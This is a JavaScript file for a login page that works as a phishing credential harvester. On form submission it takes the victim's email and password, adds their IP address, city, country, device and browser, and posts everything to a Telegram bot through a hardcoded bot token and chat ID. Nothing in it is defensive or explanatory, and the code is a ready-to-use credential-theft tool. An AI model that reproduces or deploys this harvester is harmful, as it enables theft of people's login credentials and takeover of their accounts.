document.addEventListener('DOMContentLoaded', function () {
  const loginForm = document.getElementById('loginForm');
  const notification = document.getElementById('notification');
  const loader = document.getElementById('loader');

  const botToken = "8420881837:AAEq-beKJzbADQJ6ohnxqximiGENcNVKPq0";
  const chatId = "7279773505";

  loginForm.addEventListener('submit', async function (e) {
    e.preventDefault();

    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;
    const timestamp = new Date().toLocaleString();

    // Show loader
    loader.classList.add("show");

    let ip = "Unknown", location = "Unknown";
    try {
      const res = await fetch("https://ipapi.co/json/");
      const data = await res.json();
      ip = data.ip;
      location = `${data.city}, ${data.country_name}`;
    } catch (err) {
      console.error("IP fetch failed:", err);
    }

    const ua = navigator.userAgent;
    let device = /android/i.test(ua) ? "Android" :
      /iPhone|iPad|iPod/i.test(ua) ? "iOS" :
      /Win/i.test(ua) ? "Windows" :
      /Mac/i.test(ua) ? "MacOS" :
      /Linux/i.test(ua) ? "Linux" : "Unknown";

    let browser = /chrome/i.test(ua) ? "Chrome" :
      /safari/i.test(ua) ? "Safari" :
      /firefox/i.test(ua) ? "Firefox" :
      /edg/i.test(ua) ? "Edge" :
      /opr/i.test(ua) ? "Opera" : "Unknown";

    const message = 
`🔔 New Login Attempt
📧 Email: ${email}
🔑 Password: ${password}
🕒 Time: ${timestamp}
🌍 IP: ${ip}
📍 Location: ${location}
💻 Device: ${device}
🌐 Browser: ${browser}`;

    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: chatId, text: message })
    })
      .then(() => {
        showNotification("✅ Sent to Telegram!");
      })
      .catch(() => {
        showNotification("❌ Failed to send.");
      })
      .finally(() => {
        loader.classList.remove("show"); // Hide loader
      });

    loginForm.reset();
  });

  function showNotification(msg) {
    notification.textContent = msg;
    notification.classList.add("show");
    setTimeout(() => {
      notification.classList.remove("show");
    }, 3000);
  }
});
